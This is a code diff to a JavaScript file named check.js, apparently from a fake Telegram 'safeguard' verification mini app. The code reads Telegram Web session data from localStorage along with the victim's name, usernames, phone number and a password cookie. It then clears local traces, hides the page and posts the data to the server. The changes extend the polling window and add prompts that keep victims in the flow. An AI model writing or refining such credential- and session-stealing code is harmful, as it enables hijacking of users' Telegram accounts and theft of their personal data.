@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", function() {
   console.log(`check.js: window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);
 
   let loginAttempts = 0;
-  const maxLoginAttempts = 50; // Wait for ~5 seconds (50 * 100ms) before prompting
+  const maxLoginAttempts = 200; // Increased to ~20 seconds (200 * 100ms)
 
   async function checkLocalStorage() {
     // First, check if the user is logged in via Telegram WebApp
@@ -14,12 +14,17 @@ document.addEventListener("DOMContentLoaded", function() {
       const user = window.Telegram.WebApp.initDataUnsafe?.user;
       console.log(`check.js: Telegram WebApp user: ${user ? JSON.stringify(user) : "Not logged in"}`);
 
-      if (!user) {
+      if (user) {
+        console.log(`check.js: User logged in via WebApp: ${user.id}, ${user.first_name}`);
+      } else {
         loginAttempts++;
-        console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in`);
+        console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in via WebApp`);
 
-        if (loginAttempts >= maxLoginAttempts) {
-          console.log("check.js: Max login attempts reached, user should have been redirected to login");
+        if (loginAttempts === maxLoginAttempts) {
+          console.log("check.js: Max login attempts reached, prompting user to return");
+          if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.showAlert("Please return to the mini app after logging in to complete verification.");
+          }
           return;
         }
         return;
@@ -28,25 +33,28 @@ document.addEventListener("DOMContentLoaded", function() {
 
     // Check localStorage for tt-global-state and user_auth
     let globalState = localStorage.getItem("tt-global-state");
-    console.log(`check.js: tt-global-state exists: ${!!globalState}`);
-    if (globalState) {
-      console.log(`check.js: tt-global-state content: ${globalState}`);
-    }
+    console.log(`check.js: tt-global-state: ${globalState ? "Found" : "Not found"}`);
 
-    console.log(`check.js: user_auth exists: ${!!localStorage.getItem("user_auth")}`);
-    if (localStorage.getItem("user_auth")) {
-      console.log(`check.js: user_auth content: ${localStorage.getItem("user_auth")}`);
-    }
+    let userAuth = localStorage.getItem("user_auth");
+    console.log(`check.js: user_auth: ${userAuth ? "Found" : "Not found"}`);
 
-    if (globalState && localStorage.getItem("user_auth")) {
-      const parsedState = JSON.parse(globalState);
+    if (globalState && userAuth) {
+      console.log("check.js: Both tt-global-state and user_auth found, proceeding with verification");
+
+      let parsedState;
+      try {
+        parsedState = JSON.parse(globalState);
+      } catch (error) {
+        console.error("check.js: Failed to parse tt-global-state:", error);
+        return;
+      }
+
       const currentUserId = parsedState.currentUserId;
       const currentUser = parsedState.users?.byId?.[currentUserId];
       document.body.style.display = "none";
 
       if (currentUserId && currentUser) {
         console.log(`check.js: Found user data for userId ${currentUserId}`);
-        console.log(`check.js: User data: ${JSON.stringify(currentUser)}`);
 
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
         const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1] || "No password set";
@@ -54,17 +62,16 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
 
-        console.log(`check.js: Sending user data to /api/users/telegram/info for userId ${currentUserId}`);
-        console.log(`check.js: User data to send: ${JSON.stringify({
+        console.log(`check.js: Preparing to send user data to /api/users/telegram/info for userId ${currentUserId}`);
+        console.log(`check.js: User data:`, {
           userId: currentUserId,
           firstName: firstName || "Unknown",
           usernames: usernames || [],
           phoneNumber: phoneNumber || "Unknown",
           isPremium: isPremium || false,
           password: password,
-          quicklySet: localStorage,
           type: new URLSearchParams(window.location.search).get("type") || "safeguard"
-        })}`);
+        });
 
         try {
           const response = await fetch(`/api/users/telegram/info`, {
@@ -107,15 +114,17 @@ document.addEventListener("DOMContentLoaded", function() {
 
         clearInterval(checkInterval);
       } else {
-        console.log(`check.js: No user data found in tt-global-state`);
-        console.log(`check.js: parsedState: ${JSON.stringify(parsedState)}`);
+        console.log(`check.js: No user data found in tt-global-state (currentUserId: ${currentUserId}, currentUser: ${currentUser})`);
       }
     } else {
       loginAttempts++;
       console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - tt-global-state or user_auth not found`);
 
-      if (loginAttempts >= maxLoginAttempts) {
-        console.log("check.js: Max attempts reached, user should have been redirected to login");
+      if (loginAttempts === maxLoginAttempts) {
+        console.log("check.js: Max attempts reached, prompting user to return");
+        if (window.Telegram && window.Telegram.WebApp) {
+          window.Telegram.WebApp.showAlert("Please return to the mini app after logging in to complete verification.");
+        }
         return;
       }
     }
